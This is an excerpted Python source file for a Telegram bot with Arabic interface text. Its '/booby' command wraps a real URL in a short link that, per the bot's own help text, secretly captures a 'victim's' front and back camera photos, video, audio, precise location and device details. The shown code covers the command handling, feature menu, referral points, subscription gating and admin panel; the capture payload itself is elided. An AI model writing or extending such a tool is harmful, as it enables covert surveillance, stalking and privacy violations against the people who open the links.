...
💾 **الذاكرة:** {device.get('deviceMemory', 'غير معروف')} GB
                ...
                print(f"خطأ في إرسال معلومات الجهاز: {e}")
...
def main_menu(user_id):
    ...
    markup.add(InlineKeyboardButton(f"⭐ نقاطي: {user['points'] if user else 0}", callback_data="my_points"))
    return markup
...
def start_cmd(message):
    ...
    if len(message.text.split()) > 1:
        ...
        conn.close()
        invited_by = inviter['user_id'] if inviter else None
    if not user:
...
def menu_cmd(message):
    ...
    user = get_user(user_id)
    if user:
        bot.send_message(user_id, "📋 **القائمة الرئيسية:**", parse_mode='Markdown', reply_markup=main_menu(user_id))

@bot.message_handler(commands=['booby'])
def booby_cmd(message):
    user_id = message.from_user.id
    if not check_subscription(user_id):
        bot.reply_to(message, "⚠️ يرجى الاشتراك في القنوات المطلوبة أولاً.")
        return
    if not check_daily_attempts(user_id):
        bot.reply_to(message, "⚠️ لقد تجاوزت عدد المحاولات المجانية اليومية.")
        return
    try:
        parts = message.text.split(maxsplit=2)
        if len(parts) < 3:
            bot.reply_to(message, """
❌ **استخدم:** `/booby [الرابط الأصلي] [الميزة]`

📋 **الميزات المتاحة:**
- `camera_front` - كاميرا أمامية (3 صور)
- `camera_back` - كاميرا خلفية (3 صور)
- `video_front` - فيديو أمامي (30 ثانية)
- `video_back` - فيديو خلفي (30 ثانية)
- `audio` - تسجيل صوتي (30 ثانية)
- `location` - موقع دقيق
- `device` - معلومات الجهاز
- `all` - كل الميزات

📌 **مثال:** `/booby https://youtube.com/watch?v=xxx all`
            """, parse_mode='Markdown')
            return
        ...
        short_link = create_short_link(session_id, original_url)
...
def handle_callback(call):
    ...
    if data == 'back_to_menu':
        bot.edit_message_text("📋 **القائمة الرئيسية:**", user_id, call.message.message_id, parse_mode='Markdown', reply_markup=main_menu(user_id))
    ...
    if data == 'admin_channels':
        ...
        if user and user['is_admin']:
            ...
            bot.edit_message_text(msg, user_id, call.message.message_id, parse_mode='Markdown', reply_markup=InlineKeyboardMarkup().add(InlineKeyboardButton("🔙 العودة", callback_data="admin_panel")))
        else:
            bot.answer_callback_query(call.id, "❌ غير مصرح لك")
        return
    ...
    if data == 'admin_features':
        ...
        if user and user['is_admin']:
            ...
            bot.edit_message_text("🔧 **إدارة الميزات**", user_id, call.message.message_id, parse_mode='Markdown', reply_markup=markup)
        else:
            bot.answer_callback_query(call.id, "❌ غير مصرح لك")
        return
    ...
    if data in ['camera_front', 'camera_back', 'video_front', 'video_back', 'audio', 'location', 'device', 'all']:
        ...
        bot.send_message(user_id, f"📤 أرسل الآن **الرابط الأصلي** (الموقع الذي تريد توجيه الضحية إليه):")
        bot.answer_callback_query(call.id)
        return
